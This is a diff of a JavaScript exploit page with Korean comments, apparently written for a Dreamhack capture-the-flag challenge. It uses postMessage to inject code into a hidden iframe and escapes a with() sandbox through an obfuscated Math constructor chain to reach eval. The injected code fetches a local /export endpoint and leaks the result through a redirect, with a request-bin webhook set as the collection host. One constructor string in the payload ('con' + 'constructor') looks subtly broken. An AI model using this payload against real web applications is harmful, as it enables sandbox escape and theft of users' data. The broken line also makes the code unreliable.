@@ -7,13 +7,12 @@
     <iframe id="targetFrame" src="http://localhost:5000/preview" style="display:none;"></iframe>
 
     <script>
-        // ⚠️ 민지님의 드림핵 Request Bin 전체 주소
+        // ⚠️ 민지님의 드림핵 Request Bin 전체 주소 확인
         const myWebhook = "https://rjzmtpu.request.dreamhack.games"; 
 
         const iframe = document.getElementById("targetFrame");
 
-        // [핵심] <script> 태그를 절대 쓰지 않고, 순수 자바스크립트 구문만 문자열로 빌드합니다.
-        // 대괄호 [...] 문법을 적용하여 Content-Type 헤더 버그도 완벽히 교정했습니다.
+        // 문법 오류(Content-Type, Key 연산)를 완전히 수정한 원시 실행문
         const actualAttack = 
             'window["fe" + "tch"]("http://localhost:5000/export", {' +
                 'method: "POST",' +
@@ -28,10 +27,10 @@
                 'window["par" + "ent"]["loca" + "tion"]["hr" + "ef"] = "http://localhost:5000/review?widget=" + name;' +
             '});';
 
-        // Math 객체 생성자로 with(jail) 격리를 완전히 찢어발기고 진짜 전역 eval을 획득합니다.
+        // 가장 강력한 런타임 생성자 우회 기법 (Unexpected token '<'을 일으키는 모든 요소 제거)
         const payload = '(Math["con" + "structor"]["con" + "constructor"]("return eval")()(' + JSON.stringify(actualAttack) + '))';
 
-        // 봇 리스너 안착 타이밍 미스를 방지하기 위해 0.5초 주기로 연속 주입
+        // 봇 리스너 안착 대기를 위한 시간차 연속 주입
         iframe.onload = () => {
             setInterval(() => {
                 iframe.contentWindow.postMessage(payload, "*");
